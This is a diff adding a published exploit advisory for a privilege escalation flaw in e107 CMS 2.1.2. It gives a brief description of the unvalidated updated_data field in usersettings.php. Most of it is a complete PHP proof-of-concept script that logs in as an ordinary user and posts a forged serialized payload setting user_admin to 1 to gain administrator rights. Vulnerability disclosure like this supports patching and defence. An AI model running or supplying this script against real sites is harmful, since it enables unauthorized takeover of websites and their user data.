@@ -1,0 +1,65 @@
+# Exploit Title: e107 CMS 2.1.2 Privilege Escalation
+# Date: 09-11-2016
+# Software Link: http://e107.org/
+# Exploit Author: Kacper Szurek
+# Contact: http://twitter.com/KacperSzurek
+# Website: http://security.szurek.pl/
+# Category: webapps
+ 
+1. Description
+
+Datas from `$_POST['updated_data']` inside `usersettings.php` are not properly validated so we can set `user_admin`.
+
+http://security.szurek.pl/e107-cms-211-privilege-escalation.html
+
+2. Proof of Concept
+
+<?php
+
+/**
+ * e107 CMS 2.1.2 Privilege Escalation
+ * Kacper Szurek
+ * http://security.szurek.pl
+ */
+function hack($url, $login, $pass, $cookie){
+
+	$ckfile = dirname(__FILE__) . $cookie;
+	$cookie = fopen($ckfile, 'w') or die("Cannot create cookie file");
+
+	$ch = curl_init();
+	curl_setopt($ch, CURLOPT_URL, $url);
+	curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
+	curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array('username' => $login, 'userpass' => $pass, 'userlogin' => 'Sign In')));
+	curl_setopt($ch, CURLOPT_POST, 1);
+	$content = curl_exec($ch);
+	if (strpos($content, '?logout') === false) {
+		die("Cannot login");
+	}
+
+	$data = array();
+	$data['user_admin'] = 1;
+	$data['user_perms'] = 0;
+	$data['user_password'] = md5($pass);
+
+	curl_setopt($ch, CURLOPT_URL, $url.'/usersettings.php');
+	curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array('SaveValidatedInfo' => 1, 'updated_data' => base64_encode(serialize($data)), 'updated_key' => md5(serialize($data)), 'currentpassword' => $pass)));
+	$content = curl_exec($ch);
+
+	if (strpos($content, 'Settings updated') === false) {
+		die("Exploit probably failed");
+	}
+
+	die('OK!');
+}
+
+$url = "http://url_here";
+
+// Standard user credentials 
+$user = "login_here";
+$pass = "password_here";
+
+$cookie = "/cookie.txt";
+hack($url, $user, $pass, $cookie);
